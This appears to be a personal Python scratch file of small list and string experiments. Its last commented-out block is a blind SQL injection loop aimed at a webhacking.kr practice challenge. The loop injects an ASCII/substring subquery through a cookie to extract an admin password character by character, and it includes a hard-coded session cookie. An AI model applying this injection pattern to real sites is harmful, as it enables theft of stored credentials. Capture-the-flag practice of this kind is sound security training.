import requests
import random

a = [1,2,3]

def test(arr):
    arr[0] = 3

test(a)
print(a)

if 2 in a:
    print('hi')

# a = "abcde\n"
# print(a[:-1])


# print([''.join([str(i), '\n']) for i in range(10)])


# arr = ["8000000"]

# for i in range(1, int(arr[0])):
#     arr.append("\n")
#     arr.append(str(random.randint(1,10000)))

# f = open("test", "w")
# f.write(''.join(arr))

# f.close()

# for i in range(1,17+1):    
#     query = '(select ascii(substr(pw,'+str(i)+',1)) from admin_area_pw)'
#     cookies = {'session_id': '9duomlvvtajucp5p48gv53lm5d', 'time':query}
#     res = requests.get('https://webhacking.kr/challenge/web-02/', cookies=cookies)
#     print(res.text)
